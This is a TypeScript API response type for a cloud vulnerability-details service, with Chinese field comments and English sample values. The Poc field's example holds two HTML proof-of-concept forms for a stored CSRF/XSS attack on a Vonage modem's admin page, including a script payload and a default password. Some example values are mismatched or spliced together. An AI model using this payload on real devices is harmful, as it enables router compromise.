export interface DescribeVulDetailsResponse {
    /**
     * 本次调用请求的ID，是由阿里云为该请求生成的唯一标识符，可用于排查和定位问题。
     * @example `EDA40EA3-6265-5900-AD99-C83E4F109CA8`
     */
    RequestId: string;
    /**
     * 漏洞详情列表。
     */
    Cves: {
        /**
         * 漏洞的简介。
         * @example `Chanjet T-Plus is an Internet business management software. There is an unauthorized access vulnerability in one of its interfaces disclosed on the Internet. Attackers can construct malicious requests to upload malicious files to execute arbitrary code and control the server.`
         */
        Summary: string;
        /**
         * 漏洞被利用的难度。取值：
         * - **LOW**：低
         * - **MEDIUM**：中
         * - **HIGH**：高
         * @example `LOW`
         */
        Complexity: string;
        /**
         * 受漏洞影响的产品。
         * @example `Log4j2`
         */
        Product: string;
        /**
         * POC创建的时间戳，单位为毫秒。
         * @example `1554189334000`
         */
        PocCreateTime: number;
        /**
         * CVE编号。
         * @example `CVE-2019-9167`
         */
        CveId: string;
        /**
         * CNVD（中国国家漏洞数据库）编号。
         * @example `CNVD-2019-9167`
         */
        CnvdId: string;
        /**
         * 该漏洞在阿里云漏洞库中的参考链接。
         * @example `https://example.com`
         */
        Reference: string;
        /**
         * 该漏洞在阿里云漏洞库中的CVSS评分。
         * @example `10.0`
         */
        CvssScore: string;
        /**
         * 漏洞发布的厂商。
         * @example `Apache`
         */
        Vendor: string;
        /**
         * POC暴露的时间戳，单位为毫秒。
         * @example `1554189334000`
         */
        PocDisclosureTime: number;
        /**
         * 漏洞的分类。
         * @example `remote_code_execution`
         */
        Classify: string;
        /**
         * CVSS评分向量。
         * @example `AV:N/AC:L/Au:N/C:C/I:C/A:C`
         */
        CvssVector: string;
        /**
         * 漏洞的严重等级。取值：
         * - **serious**：严重
         * - **high**：高
         * - **medium**：中
         * - **low**：低
         * @example `serious`
         */
        VulLevel: string;
        /**
         * 该漏洞在阿里云漏洞库中展示的漏洞披露时间戳，单位为毫秒。
         * @example `1554189334000`
         */
        ReleaseTime: number;
        /**
         * 漏洞公告的标题。
         * @example `Chanjet T-Plus SetupAccount/Upload. Aspx file upload vulnerability(CNVD-2022-60632)`
         */
        Title: string;
        /**
         * 漏洞的修复建议。
         * @example `<p>At present, Chanjet has urgently released a vulnerability patch to fix the vulnerability. CNVD recommends affected units and users to upgrade to the latest version immediately:</p>↵<p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>↵<p>At the same time, organizations and users affected by the vulnerability are requested to immediately follow the steps below to conduct self-inspection and repair work:</p>↵<ol>↵<li><p>User self-check steps:↵<br  />Check whether website/bin/load.aspx.cdcab7d2.compiled, website/bin/App_Web_load.aspx.cdcab7d2.dll, and tplus/Load.aspx files exist locally. If they exist, it means that they have been poisoned, and you must reinstall the system and install the product. patch.</p>↵</li>↵<li><p>Non-poisoned users please:↵<br  />1) Update the latest product patch.↵<br  />2) Install anti-virus software and update the virus database in time.↵<br  />3) Upgrade the lower version of IIS and Nginx to IIS10.0 and Windows 2016.↵<br  />4) Local installation customers need to confirm whether the backup file is complete as soon as possible, and do off-site backup. Customers on the cloud should enable the mirroring function in time.↵<br  />5) Users who fail to update the patch in time can contact Chanjet technical support and take temporary preventive measures such as deleting files.</p>↵</li>↵<li><p>Poisoned users please:↵<br  />1) Check whether the server has taken regular snapshots or backups. If so, you can restore data through snapshots or backups.↵<br  />2) Contact Chanjet technical support to confirm whether it has the conditions and operation methods to restore data from backup files.</p>↵</li>↵</ol>↵<p>If you have any technical problems, please contact Chanjet technical support: 4006600566-9</p>`
         */
        Solution: string;
        /**
         * CVE的内容。
         * @example `Apache Shiro is a user authentication and authorization framework for a wide range of rights management applications.↵Recently, Apache Shiro released version 1.7.0, which fixes the Apache Shiro authentication bypass vulnerability (CVE-2020-17510).↵Attackers can bypass Shiro's authentication using malicious requests containing payloads.↵↵Related bugs:↵CVE-2020-17510 Shiro < 1.7.0 Validation Bypass Vulnerability↵CVE-2020-13933 Shiro < 1.6.0 Validation Bypass Vulnerability↵CVE-2020-11989 Shiro < 1.5.3 Validation Bypass Vulnerability↵CVE-2020-1957 Shiro < 1.5.2 Validation Bypass Vulnerability↵CVE-2016-6802 Shiro < 1.3.2 Validation Bypass Vulnerability
        Check whether the fastjson version currently running on the system is in the affected version and whether safeMode is configured to disable autoType. If it is in the affected version and safeMode is not configured to disable autoType, the vulnerability is considered to exist.`
         */
        Content: string;
        /**
         * POC的内容。
         * @example `NewDomain.html
        The x and y values will need to be changed accordingly
        <html>
        <p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
        <form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
        <input type="hidden" name="RemoveContentRule" value="0" />
        <input type="hidden" name="AddContentRule" value="0" />
        <input type="hidden" name="ContentRules" value="0" />
        <input type="hidden" name="RuleSelect" value="0" / >
        <input type="hidden" name="NewKeyword" value="" / >
        <input type="hidden" name="KeywordAction" value="0" />
        <input type="hidden" name="NewDomain" value="test'><script>alert(1)</script>" />
        <input type="hidden" name="x" value="50" />
        <input type="hidden" name="y" value="15" />
        <input type="hidden" name="DomainAction" value="1" />
        <input type="hidden" name="AllowedDomainAction" value="0" />
        <input type="hidden" name="ParentalPassword" value="Broadcom" />
        <input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
        <input type="hidden" name="AccessDuration" value="30" />
        <input type="submit" title="Exploit" />
        </form>
        </html>
         
        NewKeyword.html
        The x and y values will need to be changed accordingly
        <html>
        <p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
        <form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
        <input type="hidden" name="RemoveContentRule" value="0" />
        <input type="hidden" name="AddContentRule" value="0" />
        <input type="hidden" name="ContentRules" value="0" />
        <input type="hidden" name="RuleSelect" value="0" / >
        <input type="hidden" name="NewKeyword" value="test'><script>alert(1)</script>" / >
        <input type="hidden" name="x" value="61" />
        <input type="hidden" name="y" value="12" />
        <input type="hidden" name="KeywordAction" value="1" />
        <input type="hidden" name="NewDomain" value="" />
        <input type="hidden" name="DomainAction" value="0" />
        <input type="hidden" name="AllowedDomainAction" value="0" />
        <input type="hidden" name="ParentalPassword" value="Broadcom" />
        <input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
        <input type="hidden" name="AccessDuration" value="30" />
        <input type="submit" title="Enable Service" />
        </form>
        </html>`
         */
        Poc: string;
        /**
         * 漏洞分类列表。
         */
        Classifys: {
            /**
             * 漏洞的分类说明。
             * @example `privilege escalation`
             */
            Description: string;
            /**
             * 漏洞的分类。
             * @example `remote_code_execution`
             */
            Classify: string;
            /**
             * 漏洞的演示视频地址。
             * @example `https://example.com`
             */
            DemoVideoUrl: string;
        }[];
        /**
         * 漏洞编号。
         * @example `CVE-2020-8597`
         */
        OtherId: string;
        /**
         * 服务器实例的名称。
         * > 该字段弃用。查询漏洞影响实例请调用[DescribeVulList ](~~DescribeVulList~~)。
         * @example `sql-test-001`
         */
        InstanceName: string;
        /**
         * 服务器的公网IP地址。
         * > 该字段弃用。查询漏洞影响实例请调用[DescribeVulList ](~~DescribeVulList~~)。
         * @example `47.114.XX.XX`
         */
        InternetIp: string;
        /**
         * 服务器的私网IP地址。
         * > 该字段弃用。查询漏洞影响实例请调用[DescribeVulList ](~~DescribeVulList~~)。
         * @example `172.19.XX.XX`
         */
        IntranetIp: string;
        /**
         * 扫描对象ID。
         * > 该字段弃用。查询漏洞影响实例请调用[DescribeVulList ](~~DescribeVulList~~)。
         * @example `m-bp17m0pc0xprzbwo****`
         */
        TargetId: string;
        /**
         * 扫描对象名称。
         * > 该字段弃用。查询漏洞影响实例请调用[DescribeVulList ](~~DescribeVulList~~)。
         * @example `frontend`
         */
        TargetName: string;
        /**
         * CVE漏洞详情链接。
         * @example `https://avd.aliyun.com/detail/CVE-2022-1184`
         */
        CveLink: string;
    }[];
}
